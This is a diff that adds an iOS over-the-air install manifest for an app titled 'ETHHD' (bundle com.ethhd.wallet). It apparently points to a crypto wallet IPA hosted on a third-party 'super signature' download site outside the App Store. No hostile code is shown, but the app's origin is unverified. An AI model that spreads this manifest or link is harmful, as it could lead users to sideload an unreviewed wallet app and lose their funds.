@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>items</key>
+    <array>
+        <dict>
+            <key>assets</key>
+            <array>
+                <dict>
+                    <key>kind</key>
+                    <string>software-package</string>
+                    <key>url</key>
+                    <string>https://cecode.top/upload/super_signature_ipa/dfc7f7c2df7375e2022f80936281a2aa9edabaccff4604011cb5624161efce90fc54a44csFYZ17.ipa</string>
+                </dict>
+            </array>
+            <key>metadata</key>
+            <dict>
+                <key>bundle-identifier</key>
+                <string>com.ethhd.wallet</string>
+                <key>bundle-version</key>
+                <string>1.0.1</string>
+                <key>kind</key>
+                <string>software</string>
+                <key>subtitle</key>
+                <string>ETHHD</string>
+                <key>title</key>
+                <string>ETHHD</string>
+            </dict>
+        </dict>
+    </array>
+</dict>
+</plist>
